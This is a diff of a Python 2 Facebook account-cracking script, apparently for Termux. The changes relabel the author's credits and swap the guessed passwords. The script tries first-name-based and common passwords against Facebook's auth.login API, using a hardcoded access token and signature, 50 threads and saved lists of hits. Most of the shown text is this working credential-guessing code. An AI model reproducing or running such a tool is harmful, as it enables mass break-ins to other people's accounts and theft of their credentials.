@@ -230,7 +230,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Rameez Sarwar
+            print "Logged in successfully as " + username #Dev:MR-ZUBAIR
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -252,7 +252,7 @@ def login():
 		jalan(' \033[1;93mWarning: \033[1;96mAlways Use a New Account To Login' )
 		jalan(' \033[1;93mWarning: \033[1;96mWear mask wash your hand and stay at home' )
 		jalan(' \033[1;93mWarning: \033[1;96mTermux  All version Work✅' )                 
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mRameez Sarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mKhan\033[1;97m•◈•▬ ▬ ▬ •◈•"
 		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
 		print('	' )
 		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
@@ -472,7 +472,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + '007'
+									pass4 = b['first_name'] + '1234'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -486,7 +486,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = 'Pakistan786'
+											pass5 = 'Name+123'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -500,7 +500,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = '000786'
+													pass6 = b['first_name'] + '12'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -536,9 +536,9 @@ def pilih_super():
 		
 	p = ThreadPool(50)
 	p.map(main, id)
-	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;93m«---•◈•---Developed By Rameez Sarwar--•◈•---»" #Dev:ITX RAMI
-	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 rameezsarwar.py)↩\033[1;97m....'
+	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[\033[1;96mKhan•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;93m«---•◈•---Developed By MR Zaibi --•◈•---»" #Dev:ITX ZAINI
+	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Khan.py)↩\033[1;97m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
                          ¸,.-~·¹´¨¨¨¨¨¨¨¨¨¨¨¨¨¨`²·~-.,¸        
@@ -561,10 +561,9 @@ def pilih_super():
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;96m ....Itx Rami....... \033[1;93m :
-•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
- If you have any problems then contact with me on WhatsApp Number
-              \033[1;96m +923075151073"""
+: \033[1;96m ....Itx ZUBI....... \033[1;93m MR-ZUBI") 
+
+
 	
 	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
 	menu()
